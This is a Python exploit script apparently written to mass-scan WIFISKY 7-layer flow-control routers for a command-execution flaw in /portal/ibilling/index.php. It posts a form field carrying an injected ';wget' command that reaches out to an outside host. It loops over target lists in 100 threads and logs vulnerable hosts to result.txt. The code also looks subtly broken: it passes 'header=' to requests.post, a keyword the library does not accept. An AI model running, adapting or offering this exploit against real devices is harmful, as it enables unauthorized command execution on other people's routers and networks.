import requests,argparse,sys
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()
RED = '\033[91m'
RESET = '\033[0m'


def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                        info:WIFISKY 7层流控路由器index存在命令执行漏洞  
                                        version:1.0 author:YeahSir               
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='WIFISKY 7层流控路由器index存在命令执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/portal/ibilling/index.php"
    url = target + payload_url
    header = {"Content-Type": "application/x-www-form-urlencoded", 
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            }
    data = {"type":5,"version":2,"bypass":";wget xxxxxx.cn"}
    try:
        res1 = requests.get(url=target, verify=False)
        res2 = requests.post(url, header=header, data=data, verify=False)
        if res1.status_code == 200:
            if res2.status_code == 200 and 'success' in res2.text :
                print(f'{RED}[+] 该url{target}存在命令执行漏洞{RESET}')
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f'[-] 该站点{target}不存在命令执行漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()